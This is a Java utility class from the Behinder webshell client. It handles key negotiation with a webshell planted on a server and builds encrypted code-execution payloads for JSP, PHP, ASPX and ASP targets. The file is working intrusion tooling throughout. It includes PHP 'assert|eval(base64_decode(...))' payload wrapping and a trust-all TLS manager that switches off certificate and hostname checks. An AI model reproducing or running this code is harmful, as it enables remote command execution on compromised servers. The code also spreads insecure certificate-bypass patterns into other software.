package net.rebeyond.behinder.utils;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import net.rebeyond.behinder.core.Crypt;
import net.rebeyond.behinder.core.Params;
import net.rebeyond.behinder.ui.controller.MainController;
import net.rebeyond.behinder.utils.jc.Run;
import org.json.JSONObject;

import javax.net.ssl.*;
import javax.tools.*;
import javax.tools.JavaFileObject.Kind;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.security.KeyManagementException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.List;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipInputStream;

public class Utils {
    private static final Map<String, JavaFileObject> fileObjects = new ConcurrentHashMap<>();

    public Utils() {
    }

    public static boolean checkIP(String ipAddress) {
        String ip = "([1-9]|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])(\\.(\\d|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])){3}";
        Pattern pattern = Pattern.compile(ip);
        Matcher matcher = pattern.matcher(ipAddress);
        return matcher.matches();
    }

    public static boolean checkPort(String portTxt) {
        String port = "([0-9]{1,5})";
        Pattern pattern = Pattern.compile(port);
        Matcher matcher = pattern.matcher(portTxt);
        return matcher.matches() && Integer.parseInt(portTxt) >= 1 && Integer.parseInt(portTxt) <= 65535;
    }

    public static Map<String, String> getKeyAndCookie(String getUrl, String password, Map<String, String> requestHeaders) throws Exception {
        disableSslVerification();
        Map<String, String> result = new HashMap<String, String>();
        StringBuffer sb = new StringBuffer();
        InputStreamReader isr = null;
        BufferedReader br = null;
        URL url;
        if (getUrl.indexOf("?") > 0) {
            url = new URL(getUrl + "&" + password + "=" + (new Random()).nextInt(1000));
        } else {
            url = new URL(getUrl + "?" + password + "=" + (new Random()).nextInt(1000));
        }

        HttpURLConnection.setFollowRedirects(false);
        HttpURLConnection urlConnection;
        Proxy proxy;
        if (url.getProtocol().equals("https")) {
            if (MainController.currentProxy.get("proxy") != null) {
                proxy = (Proxy) MainController.currentProxy.get("proxy");
                urlConnection = (HttpsURLConnection) url.openConnection(proxy);
            } else {
                urlConnection = (HttpsURLConnection) url.openConnection();
            }
        } else if (MainController.currentProxy.get("proxy") != null) {
            proxy = (Proxy) MainController.currentProxy.get("proxy");
            urlConnection = (HttpURLConnection) url.openConnection(proxy);
        } else {
            urlConnection = (HttpURLConnection) url.openConnection();
        }

        Iterator<String> var23 = requestHeaders.keySet().iterator();

        String errorMsg;
        while (var23.hasNext()) {
            errorMsg = var23.next();
            (urlConnection).setRequestProperty(errorMsg, requestHeaders.get(errorMsg));
        }

        if ((urlConnection).getResponseCode() == 302 || (urlConnection).getResponseCode() == 301) {
            String urlwithSession = ((String) ((List) (urlConnection).getHeaderFields().get("Location")).get(0));
            if (!urlwithSession.startsWith("http")) {
                urlwithSession = url.getProtocol() + "://" + url.getHost() + ":" + (url.getPort() == -1 ? url.getDefaultPort() : url.getPort()) + urlwithSession;
                urlwithSession = urlwithSession.replaceAll(password + "=[0-9]*", "");
            }

            result.put("urlWithSession", urlwithSession);
        }

        boolean error = false;
        errorMsg = "";
        if ((urlConnection).getResponseCode() == 500) {
            isr = new InputStreamReader((urlConnection).getErrorStream());
            error = true;
            errorMsg = "密钥获取失败,密码错误?";
        } else if ((urlConnection).getResponseCode() == 404) {
            isr = new InputStreamReader((urlConnection).getErrorStream());
            error = true;
            errorMsg = "页面返回404错误";
        } else {
            isr = new InputStreamReader((urlConnection).getInputStream());
        }

        br = new BufferedReader(isr);

        String line;
        while ((line = br.readLine()) != null) {
            sb.append(line);
        }

        br.close();
        if (error) {
            throw new Exception(errorMsg);
        } else {
            String rawKey_1 = sb.toString();
            String pattern = "[a-fA-F0-9]{16}";
            Pattern r = Pattern.compile(pattern);
            Matcher m = r.matcher(rawKey_1);
            if (!m.find()) {
                throw new Exception("页面存在，但是无法获取密钥!");
            } else {
                int start = 0;
                int end = 0;
                int cycleCount = 0;

                while (true) {
                    Map<String, String> KeyAndCookie = getRawKey(getUrl, password, requestHeaders);
                    String rawKey_2 = KeyAndCookie.get("key");
                    byte[] temp = CipherUtils.bytesXor(rawKey_1.getBytes(), rawKey_2.getBytes());

                    int i;
                    for (i = 0; i < temp.length; ++i) {
                        if (temp[i] > 0) {
                            if (start == 0 || i <= start) {
                                start = i;
                            }
                            break;
                        }
                    }

                    for (i = temp.length - 1; i >= 0; --i) {
                        if (temp[i] > 0) {
                            if (i >= end) {
                                end = i + 1;
                            }
                            break;
                        }
                    }

                    if (end - start == 16) {
                        result.put("cookie", KeyAndCookie.get("cookie"));
                        result.put("beginIndex", start + "");
                        result.put("endIndex", temp.length - end + "");
                        String finalKey = new String(Arrays.copyOfRange(rawKey_2.getBytes(), start, end));
                        result.put("key", finalKey);
                        return result;
                    }

                    if (cycleCount > 10) {
                        throw new Exception("Can't figure out the key!");
                    }

                    ++cycleCount;
                }
            }
        }
    }

    public static String getKey(String password) throws Exception {
        return getMD5(password);
    }

    public static Map<String, String> getRawKey(String getUrl, String password, Map<String, String> requestHeaders) throws Exception {
        Map<String, String> result = new HashMap<String, String>();
        StringBuffer sb = new StringBuffer();
        InputStreamReader isr = null;
        BufferedReader br = null;
        URL url;
        if (getUrl.indexOf("?") > 0) {
            url = new URL(getUrl + "&" + password + "=" + (new Random()).nextInt(1000));
        } else {
            url = new URL(getUrl + "?" + password + "=" + (new Random()).nextInt(1000));
        }

        HttpURLConnection.setFollowRedirects(false);
        HttpURLConnection urlConnection;
        if (url.getProtocol().equals("https")) {
            urlConnection = (HttpsURLConnection) url.openConnection();
        } else {
            urlConnection = (HttpURLConnection) url.openConnection();
        }

        for (String o : requestHeaders.keySet()) {
            String headerName = o;
            (urlConnection).setRequestProperty(headerName, requestHeaders.get(headerName));
        }

        String cookieValues = "";
        Map<String, List<String>> headers = (urlConnection).getHeaderFields();
        Iterator<String> var11 = headers.keySet().iterator();

        String errorMsg;
        while (var11.hasNext()) {
            errorMsg = var11.next();
            if (errorMsg != null && errorMsg.equalsIgnoreCase("Set-Cookie")) {
                String cookieValue;
                for (Iterator var13 = (headers.get(errorMsg)).iterator(); var13.hasNext(); cookieValues = cookieValues + ";" + cookieValue) {
                    cookieValue = (String) var13.next();
                    cookieValue = cookieValue.replaceAll(";[\\s]*path=[\\s\\S]*;?", "");
                }

                cookieValues = cookieValues.startsWith(";") ? cookieValues.replaceFirst(";", "") : cookieValues;
                break;
            }
        }

        result.put("cookie", cookieValues);
        boolean error = false;
        errorMsg = "";
        if ((urlConnection).getResponseCode() == 500) {
            isr = new InputStreamReader((urlConnection).getErrorStream());
            error = true;
            errorMsg = "密钥获取失败,密码错误?";
        } else if ((urlConnection).getResponseCode() == 404) {
            isr = new InputStreamReader((urlConnection).getErrorStream());
            error = true;
            errorMsg = "页面返回404错误";
        } else {
            isr = new InputStreamReader((urlConnection).getInputStream());
        }

        br = new BufferedReader(isr);

        String line;
        while ((line = br.readLine()) != null) {
            sb.append(line);
        }

        br.close();
        if (error) {
            throw new Exception(errorMsg);
        } else {
            result.put("key", sb.toString());
            return result;
        }
    }

    public static String sendPostRequest(String urlPath, String cookie, String data) throws Exception {
        StringBuilder result = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }

        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data.getBytes());
        outwritestream.flush();
        outwritestream.close();
        String line;
        if (conn.getResponseCode() == 200) {
            for (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8)); (line = reader.readLine()) != null; result = result.append(line + "\n")) {
            }
        }

        return result.toString();
    }

    public static Map requestAndParse(String urlPath, Map<String, String> header, byte[] data, int beginIndex, int endIndex) throws Exception {
        Map resultObj = sendPostRequestBinary(urlPath, header, data);
        byte[] resData = (byte[]) resultObj.get("data");
        if ((beginIndex != 0 || endIndex != 0) && resData.length - endIndex >= beginIndex) {
            resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
        }

        resultObj.put("data", resData);
        return resultObj;
    }

    public static Map sendPostRequestBinary(String urlPath, Map<String, String> header, byte[] data) throws Exception {
        Map result = new HashMap();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        URL url = new URL(urlPath);
        HttpURLConnection conn;
        if (MainController.currentProxy.get("proxy") != null) {
            Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
            conn = (HttpURLConnection) url.openConnection(proxy);
        } else {
            conn = (HttpURLConnection) url.openConnection();
        }

        conn.setRequestProperty("Content-Type", "application/octet-stream");
        conn.setRequestMethod("POST");
        if (header != null) {

            for (String o : header.keySet()) {
                String key = o;
                conn.setRequestProperty(key, header.get(key));
            }
        }

        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data);
        outwritestream.flush();
        outwritestream.close();
        byte[] buffer;
        boolean var10;
        DataInputStream din;
        int length;
        if (conn.getResponseCode() == 200) {
            din = new DataInputStream(conn.getInputStream());
            buffer = new byte[1024];
            var10 = false;

            while ((length = din.read(buffer)) != -1) {
                bos.write(buffer, 0, length);
            }

            byte[] resData = bos.toByteArray();
            result.put("data", resData);
            Map responseHeader = new HashMap();

            for (String key : conn.getHeaderFields().keySet()) {
                responseHeader.put(key, conn.getHeaderField(key));
            }

            responseHeader.put("status", conn.getResponseCode() + "");
            result.put("header", responseHeader);
            return result;
        } else {
            din = new DataInputStream(conn.getErrorStream());
            buffer = new byte[1024];
            var10 = false;

            while ((length = din.read(buffer)) != -1) {
                bos.write(buffer, 0, length);
            }

            throw new Exception(new String(bos.toByteArray(), "GBK"));
        }
    }

    public static String sendPostRequest(String urlPath, String cookie, byte[] data) throws Exception {
        StringBuilder sb = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestProperty("Content-Type", "application/octet-stream");
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }

        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data);
        outwritestream.flush();
        outwritestream.close();
        BufferedReader reader;
        String line;
        if (conn.getResponseCode() == 200) {
            for (reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8)); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            String result = sb.toString();
            if (result.endsWith("\n")) {
                result = result.substring(0, result.length() - 1);
            }

            return result;
        } else {
            for (reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), StandardCharsets.UTF_8)); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            throw new Exception("请求返回异常" + sb.toString());
        }
    }

    public static String sendGetRequest(String urlPath, String cookie) throws Exception {
        StringBuilder sb = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestProperty("Content-Type", "text/plain");
        conn.setRequestMethod("GET");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }

        BufferedReader reader;
        String line;
        if (conn.getResponseCode() == 200) {
            for (reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8)); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            String result = sb.toString();
            if (result.endsWith("\n")) {
                result = result.substring(0, result.length() - 1);
            }

            return result;
        } else {
            for (reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), StandardCharsets.UTF_8)); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
            }

            throw new Exception("请求返回异常" + sb.toString());
        }
    }

    public static byte[] getEvalData(String key, int encryptType, String type, byte[] payload) throws Exception {
        byte[] result = null;
        byte[] encrypedBincls;
        switch (type) {
            case "jsp":
                encrypedBincls = Crypt.Encrypt(payload, key);
                String basedEncryBincls = Base64.encode(encrypedBincls);
                result = basedEncryBincls.getBytes();
                break;
            case "php":
                encrypedBincls = ("assert|eval(base64_decode('" + Base64.encode(payload) + "'));").getBytes();
                encrypedBincls = Crypt.EncryptForPhp(encrypedBincls, key, encryptType);
                result = Base64.encode(encrypedBincls).getBytes();
                break;
            case "aspx":
                Map params = new LinkedHashMap();
                params.put("code", new String(payload));
                result = getData(key, encryptType, "Eval", params, type);
                break;
            case "asp":
                encrypedBincls = Crypt.EncryptForAsp(payload, key);
                result = encrypedBincls;
                break;
        }

        return result;
    }

    public static byte[] getPluginData(String key, int encryptType, String payloadPath, Map params, String type) throws Exception {
        byte[] bincls;
        if (type.equals("jsp")) {
            bincls = Params.getParamedClassForPlugin(payloadPath, params);
            return bincls;
        } else {
            byte[] encrypedBincls;
            switch (type) {
                case "php":
                    bincls = Params.getParamedPhp(payloadPath, params);
                    bincls = Base64.encode(bincls).getBytes();
                    bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
                    encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
                    return Base64.encode(encrypedBincls).getBytes();
                case "aspx":
                    bincls = Params.getParamedAssembly(payloadPath, params);
                    encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
                    return encrypedBincls;
                case "asp":
                    bincls = Params.getParamedAsp(payloadPath, params);
                    encrypedBincls = Crypt.EncryptForAsp(bincls, key);
                    return encrypedBincls;
                default:
                    return null;
            }
        }
    }

    public static byte[] getData(String key, int encryptType, String className, Map params, String type) throws Exception {
        return getData(key, encryptType, className, params, type, null);
    }

    public static String map2Str(Map<String, String> paramsMap) {
        String result = "";

        String key;
        Iterator<String> var2;
        for (var2 = paramsMap.keySet().iterator(); var2.hasNext(); result = result + key + "^" + paramsMap.get(key) + "\n") {
            key = var2.next();
        }

        return result;
    }

    public static byte[] getData(String key, int encryptType, String className, Map params, String type, byte[] extraData) throws Exception {
        byte[] bincls;
        byte[] encrypedBincls;
        switch (type) {
            case "jsp":
                className = "net.rebeyond.behinder.payload.java." + className;
                bincls = Params.getParamedClass(className, params);
                if (extraData != null) {
                    bincls = CipherUtils.mergeByteArray(bincls, extraData);
                }

                encrypedBincls = Crypt.Encrypt(bincls, key);
                String basedEncryBincls = Base64.encode(encrypedBincls);
                return basedEncryBincls.getBytes();
            case "php":
                bincls = Params.getParamedPhp(className, params);
                bincls = Base64.encode(bincls).getBytes();
                bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
                if (extraData != null) {
                    bincls = CipherUtils.mergeByteArray(bincls, extraData);
                }

                encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
                return Base64.encode(encrypedBincls).getBytes();
            case "aspx":
                bincls = Params.getParamedAssembly(className, params);
                if (extraData != null) {
                    bincls = CipherUtils.mergeByteArray(bincls, extraData);
                }

                encrypedBincls = Crypt.EncryptForCSharp(bincls, key);
                return encrypedBincls;
            case "asp":
                bincls = Params.getParamedAsp(className, params);
                if (extraData != null) {
                    bincls = CipherUtils.mergeByteArray(bincls, extraData);
                }

                encrypedBincls = Crypt.EncryptForAsp(bincls, key);
                return encrypedBincls;
            default:
                return null;
        }
    }

    public static byte[] getFileData(String filePath) throws Exception {
        byte[] fileContent = new byte[0];
        FileInputStream fis = new FileInputStream(new File(filePath));
        byte[] buffer = new byte[10240000];

        int length;
        while ((length = fis.read(buffer)) > 0) {
            fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length));
        }

        fis.close();
        return fileContent;
    }

    public static List<byte[]> splitBytes(byte[] content, int size) throws Exception {
        List<byte[]> result = new ArrayList<>();
        byte[] buffer = new byte[size];
        ByteArrayInputStream bis = new ByteArrayInputStream(content);
        int length;
        while ((length = bis.read(buffer)) > 0) {
            result.add(Arrays.copyOfRange(buffer, 0, length));
        }

        bis.close();
        return result;
    }

    public static void setClipboardString(String text) {
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        Transferable trans = new StringSelection(text);
        clipboard.setContents(trans, null);
    }

    public static byte[] getResourceData(String filePath) throws Exception {
        InputStream is = Utils.class.getClassLoader().getResourceAsStream(filePath);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buffer = new byte[102400];
        boolean var4 = false;

        int num;
        while ((num = is.read(buffer)) != -1) {
            bos.write(buffer, 0, num);
            bos.flush();
        }

        is.close();
        return bos.toByteArray();
    }

    public static byte[] ascii2unicode(String str, int type) throws Exception {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(buf);
        byte[] var4 = str.getBytes();
        int var5 = var4.length;

        for (int var6 = 0; var6 < var5; ++var6) {
            byte b = var4[var6];
            out.writeByte(b);
            out.writeByte(0);
        }

        if (type == 1) {
            out.writeChar(0);
        }

        return buf.toByteArray();
    }

    public static byte[] mergeBytes(byte[] a, byte[] b) throws Exception {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        output.write(a);
        output.write(b);
        return output.toByteArray();
    }

    public static byte[] getClassFromSourceCode(String sourceCode) throws Exception {
        return Run.getClassFromSourceCode(sourceCode);
    }

    public static String getSelfPath() throws Exception {
        String currentPath = Utils.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
        currentPath = (new File(currentPath)).getCanonicalPath();
        return currentPath;
    }

    public static JSONObject parsePluginZip(String zipFilePath) throws Exception {
        String pluginRootPath = getSelfPath() + "/Plugins";
        String pluginName = "";
        ZipFile zf = new ZipFile(zipFilePath);
        InputStream in = new BufferedInputStream(new FileInputStream(zipFilePath));
        ZipInputStream zin = new ZipInputStream(in);

        ZipEntry ze;
        while ((ze = zin.getNextEntry()) != null) {
            if (ze.getName().equals("plugin.config")) {
                BufferedReader br = new BufferedReader(new InputStreamReader(zf.getInputStream(ze)));
                Properties pluginConfig = new Properties();
                pluginConfig.load(br);
                pluginName = pluginConfig.getProperty("name");
                br.close();
            }
        }

        zin.closeEntry();
        String pluginPath = pluginRootPath + "/" + pluginName;
        ZipUtil.unZipFiles(zipFilePath, pluginPath);
        FileInputStream fis = new FileInputStream(pluginPath + "/plugin.config");
        Properties pluginConfig = new Properties();
        pluginConfig.load(fis);
        JSONObject pluginEntity = new JSONObject();
        pluginEntity.put("name", pluginName);
        pluginEntity.put("version", pluginConfig.getProperty("version", "v1.0"));
        pluginEntity.put("entryFile", pluginConfig.getProperty("entry", "index.htm"));
        pluginEntity.put("icon", pluginConfig.getProperty("icon", "/Users/rebeyond/host.png"));
        pluginEntity.put("scriptType", pluginConfig.getProperty("scriptType"));
        pluginEntity.put("isGetShell", pluginConfig.getProperty("isGetShell"));
        pluginEntity.put("type", pluginConfig.getProperty("type"));
        pluginEntity.put("author", pluginConfig.getProperty("author"));
        pluginEntity.put("link", pluginConfig.getProperty("link"));
        pluginEntity.put("qrcode", pluginConfig.getProperty("qrcode"));
        pluginEntity.put("comment", pluginConfig.getProperty("comment"));
        return pluginEntity;
    }

    public static Object json2Obj(JSONObject json, Class target) throws Exception {
        Object obj = target.newInstance();
        Field[] var3 = target.getDeclaredFields();
        int var4 = var3.length;

        for (int var5 = 0; var5 < var4; ++var5) {
            Field f = var3[var5];

            try {
                String filedName = f.getName();
                String setName = "set" + filedName.substring(0, 1).toUpperCase() + filedName.substring(1);
                Method m = target.getMethod(setName, String.class);
                m.invoke(obj, json.get(filedName).toString());
            } catch (Exception var10) {
            }
        }

        return obj;
    }

    public static String getMD5(String clearText) throws NoSuchAlgorithmException {
        MessageDigest m = MessageDigest.getInstance("MD5");
        m.update(clearText.getBytes(), 0, clearText.length());
        String hash = (new BigInteger(1, m.digest())).toString(16).substring(0, 16);
        return hash;
    }

    public static void main(String[] args) {
        String sourceCode = "package net.rebeyond.behinder.utils;public class Hello{    public String sayHello (String name) {return \"Hello,\" + name + \"!\";}}";

        try {
            getClassFromSourceCode(sourceCode);
        } catch (Exception var3) {
            var3.printStackTrace();
        }

    }

    private static void disableSslVerification() {
        try {
            TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {
                public X509Certificate[] getAcceptedIssuers() {
                    return null;
                }

                public void checkClientTrusted(X509Certificate[] certs, String authType) {
                }

                public void checkServerTrusted(X509Certificate[] certs, String authType) {
                }
            }};
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new SecureRandom());
            List<String> cipherSuites = new ArrayList<String>();
            String[] var3 = sc.getSupportedSSLParameters().getCipherSuites();
            int var4 = var3.length;

            for (int var5 = 0; var5 < var4; ++var5) {
                String cipher = var3[var5];
                if (!cipher.contains("_DHE_") && !cipher.contains("_DH_")) {
                    cipherSuites.add(cipher);
                }
            }

            HttpsURLConnection.setDefaultSSLSocketFactory(new Utils.MySSLSocketFactory(sc.getSocketFactory(), cipherSuites.toArray(new String[0])));
            HostnameVerifier allHostsValid = (hostname, session) -> true;
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
        } catch (NoSuchAlgorithmException var7) {
            var7.printStackTrace();
        } catch (KeyManagementException var8) {
            var8.printStackTrace();
        }

    }

    public static Map<String, String> jsonToMap(JSONObject obj) {
        Map<String, String> result = new HashMap<String, String>();

        for (String key : obj.keySet()) {
            result.put(key, (String) obj.get(key));
        }

        return result;
    }

    public static Timestamp stringToTimestamp(String timeString) {
        Timestamp timestamp = null;

        try {
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss.SSS");
            Date parsedDate = dateFormat.parse(timeString);
            timestamp = new Timestamp(parsedDate.getTime());
        } catch (Exception var4) {
        }

        return timestamp;
    }

    public static class MyJavaFileManager extends ForwardingJavaFileManager {
        protected MyJavaFileManager(JavaFileManager fileManager) {
            super(fileManager);
        }

        public JavaFileObject getJavaFileForInput(Location location, String className, Kind kind) throws IOException {
            JavaFileObject javaFileObject = Utils.fileObjects.get(className);
            if (javaFileObject == null) {
                super.getJavaFileForInput(location, className, kind);
            }

            return javaFileObject;
        }

        public JavaFileObject getJavaFileForOutput(Location location, String qualifiedClassName, Kind kind, FileObject sibling) throws IOException {
            JavaFileObject javaFileObject = new Utils.MyJavaFileObject(qualifiedClassName, kind);
            Utils.fileObjects.put(qualifiedClassName, javaFileObject);
            return javaFileObject;
        }
    }

    private static class MySSLSocketFactory extends SSLSocketFactory {
        private SSLSocketFactory sf;
        private String[] enabledCiphers;

        private MySSLSocketFactory(SSLSocketFactory sf, String[] enabledCiphers) {
            this.sf = null;
            this.enabledCiphers = null;
            this.sf = sf;
            this.enabledCiphers = enabledCiphers;
        }

        private Socket getSocketWithEnabledCiphers(Socket socket) {
            if (this.enabledCiphers != null && socket != null && socket instanceof SSLSocket) {
                ((SSLSocket) socket).setEnabledCipherSuites(this.enabledCiphers);
            }

            return socket;
        }

        public Socket createSocket(Socket s, String host, int port, boolean autoClose) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(s, host, port, autoClose));
        }

        public String[] getDefaultCipherSuites() {
            return this.sf.getDefaultCipherSuites();
        }

        public String[] getSupportedCipherSuites() {
            return this.enabledCiphers == null ? this.sf.getSupportedCipherSuites() : this.enabledCiphers;
        }

        public Socket createSocket(String host, int port) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(host, port));
        }

        public Socket createSocket(InetAddress address, int port) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(address, port));
        }

        public Socket createSocket(String host, int port, InetAddress localAddress, int localPort) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(host, port, localAddress, localPort));
        }

        public Socket createSocket(InetAddress address, int port, InetAddress localaddress, int localport) throws IOException {
            return this.getSocketWithEnabledCiphers(this.sf.createSocket(address, port, localaddress, localport));
        }
    }

    public static class MyJavaFileObject extends SimpleJavaFileObject {
        private final String source;
        private ByteArrayOutputStream outPutStream;

        public MyJavaFileObject(String name, String source) {
            super(URI.create("String:///" + name + Kind.SOURCE.extension), Kind.SOURCE);
            this.source = source;
        }

        public MyJavaFileObject(String name, Kind kind) {
            super(URI.create("String:///" + name + kind.extension), kind);
            this.source = null;
        }

        public CharSequence getCharContent(boolean ignoreEncodingErrors) {
            if (this.source == null) {
                throw new IllegalArgumentException("source == null");
            } else {
                return this.source;
            }
        }

        public OutputStream openOutputStream() throws IOException {
            this.outPutStream = new ByteArrayOutputStream();
            return this.outPutStream;
        }

        public byte[] getCompiledBytes() {
            return this.outPutStream.toByteArray();
        }
    }
}
